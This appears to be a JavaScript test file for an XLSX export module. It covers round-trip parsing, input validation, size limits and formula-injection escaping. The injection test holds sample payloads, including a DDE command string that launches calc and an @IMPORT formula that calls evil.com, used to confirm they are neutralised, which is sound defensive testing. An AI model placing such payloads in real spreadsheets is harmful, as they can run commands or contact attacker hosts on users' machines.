import test from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
const {
  generatePortableXlsx,
  PORTABLE_XLSX_LIMITS,
  PORTABLE_XLSX_SCHEMA,
} = require("../../shell/exports/portable-xlsx-candidate.cjs");

const { inspectOfficeZip } = require("../../shell/attachments/office-zip-guard.cjs");
const { extractStructuredOffice } = require("../../shell/attachments/ooxml-structured-text.cjs");

test("Portable XLSX - Valid multi-sheet generation and round-trip readback via existing office parser", () => {
  const input = {
    title: "Quarterly Financials",
    sheets: [
      {
        name: "Q1 Summary",
        cells: [
          ["Item", "Amount (CNY)", "Verified", "Notes"],
          ["研发支出（AI模型微调）", 1250000.5, true, "保持换行\n第二行备注"],
          ["基础设施服务器", 880000, false, null],
        ],
      },
      {
        name: "Tax Breakdown",
        cells: [
          ["Category", "Rate"],
          ["增值税", 0.06],
        ],
      },
    ],
  };

  const originalInputSnapshot = JSON.stringify(input);

  const res = generatePortableXlsx(input);

  // 1. 基本元数据验证
  assert.equal(res.mimeType, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
  assert.equal(typeof res.bytes, "number");
  assert.equal(res.buffer.length, res.bytes);
  assert.equal(res.sha256.length, 64);
  assert.equal(res.degradations.length, 0);

  // 2. 验证输入对象未被篡改 (Immutability)
  assert.equal(JSON.stringify(input), originalInputSnapshot);

  // 3. 独立现有 parser 反读核验 (inspectOfficeZip + extractStructuredOffice)
  const archive = inspectOfficeZip(res.buffer);
  assert.ok(archive.names.includes("[Content_Types].xml"));
  assert.ok(archive.names.includes("xl/workbook.xml"));
  assert.ok(archive.names.includes("xl/worksheets/sheet1.xml"));
  assert.ok(archive.names.includes("xl/worksheets/sheet2.xml"));

  const parsed = extractStructuredOffice(res.buffer, "xlsx", archive);
  assert.equal(parsed.partCount, 2);

  // 验证工作表 1 内容
  const b1 = parsed.blocks.find((b) => b.locator.cell === "A2");
  assert.equal(b1.text, "研发支出（AI模型微调）");
  assert.equal(b1.locator.sheetName, "Q1 Summary");
  assert.equal(b1.locator.valueType, "inlineStr");
  assert.equal(b1.locator.formula, false);

  const b2 = parsed.blocks.find((b) => b.locator.cell === "B2");
  assert.equal(b2.text, "1250000.5");
  assert.equal(b2.locator.valueType, "n");

  const b3 = parsed.blocks.find((b) => b.locator.cell === "C2");
  assert.equal(b3.text, "1");
  assert.equal(b3.locator.valueType, "b");

  const b4 = parsed.blocks.find((b) => b.locator.cell === "D2");
  assert.ok(b4.text.includes("保持换行\n第二行备注"));
});

test("Portable XLSX - Reject-before-Scan: arrays, bounds, sheet names, and control characters", () => {
  // 1. 空 sheets
  assert.throws(() => {
    generatePortableXlsx({ sheets: [] });
  }, { code: "EMPTY_SHEETS" });

  // 2. 超限 sheets (前置 O(1) 拦截)
  let sheetAccess = 0;
  const oversizedSheets = new Proxy(new Array(PORTABLE_XLSX_LIMITS.maxSheets + 5), {
    get(target, prop) {
      if (!isNaN(Number(prop))) sheetAccess++;
      return target[prop];
    },
  });
  assert.throws(() => {
    generatePortableXlsx({ sheets: oversizedSheets });
  }, { code: "SHEET_LIMIT_EXCEEDED" });
  assert.equal(sheetAccess, 0, "No element should be accessed when sheet length exceeds limit");

  // 3. 非法/重复工作表名
  assert.throws(() => {
    generatePortableXlsx({
      sheets: [
        { name: "Invalid:Name", cells: [["a"]] },
      ],
    });
  }, { code: "INVALID_SHEET_NAME_CHARACTERS" });

  assert.throws(() => {
    generatePortableXlsx({
      sheets: [
        { name: "Sheet1", cells: [["a"]] },
        { name: "sheet1", cells: [["b"]] }, // 大小写不敏感重复
      ],
    });
  }, { code: "DUPLICATE_SHEET_NAME" });

  // 4. NaN / Infinity 拒绝
  assert.throws(() => {
    generatePortableXlsx({
      sheets: [
        { name: "S1", cells: [[NaN]] },
      ],
    });
  }, { code: "INVALID_CELL_VALUE" });

  assert.throws(() => {
    generatePortableXlsx({
      sheets: [
        { name: "S1", cells: [[Infinity]] },
      ],
    });
  }, { code: "INVALID_CELL_VALUE" });

  // 5. 非法 XML 控制字符拒绝
  assert.throws(() => {
    generatePortableXlsx({
      sheets: [
        { name: "S1", cells: [["bad\x00char"]] },
      ],
    });
  }, { code: "INVALID_XML_CHARACTER" });
});

test("Portable XLSX - Formula injection defense and no guessing string numbers", () => {
  const input = {
    sheets: [
      {
        name: "Security",
        cells: [
          ["=SUM(A1:A10)", "+CMD|' /C calc'!A0", "-5+10", "@IMPORT('http://evil.com')"],
          ["123456", "true", "2026-11-01"], // 字符串数字/布尔/日期绝不猜测转换为数值
        ],
      },
    ],
  };

  const res = generatePortableXlsx(input);

  // 验证 degradations 记录了公式转义
  assert.equal(res.degradations.length, 4);
  assert.equal(res.degradations[0].cell, "A1");
  assert.equal(res.degradations[0].original, "=SUM(A1:A10)");

  // 使用现有 parser 反读
  const archive = inspectOfficeZip(res.buffer);
  const parsed = extractStructuredOffice(res.buffer, "xlsx", archive);

  // 验证全部以 inlineStr 安全存储，formula 属性严格为 false
  for (const block of parsed.blocks) {
    assert.equal(block.locator.formula, false);
    assert.equal(block.locator.valueType, "inlineStr");
  }

  // 验证原公式前缀被单引号安全转义
  const cellA1 = parsed.blocks.find((b) => b.locator.cell === "A1");
  assert.equal(cellA1.text, "'=SUM(A1:A10)");

  // 验证 "123456" 绝无猜成数字，类型依然为 inlineStr
  const cellA2 = parsed.blocks.find((b) => b.locator.cell === "A2");
  assert.equal(cellA2.text, "123456");
  assert.equal(cellA2.locator.valueType, "inlineStr");
});

test("Portable XLSX - Custom limits and resource ceiling boundaries", () => {
  // 自定义 limits 降低到 maxCells: 4
  assert.throws(() => {
    generatePortableXlsx({
      sheets: [
        {
          name: "Small",
          cells: [
            [1, 2, 3],
            [4, 5], // 总数 5 > 4
          ],
        },
      ],
    }, { maxCells: 4 });
  }, { code: "CELL_LIMIT_EXCEEDED" });

  // 字符串长度超限
  assert.throws(() => {
    generatePortableXlsx({
      sheets: [
        {
          name: "Small",
          cells: [["too long string"]],
        },
      ],
    }, { maxStringLength: 5 });
  }, { code: "STRING_LENGTH_EXCEEDED" });
});
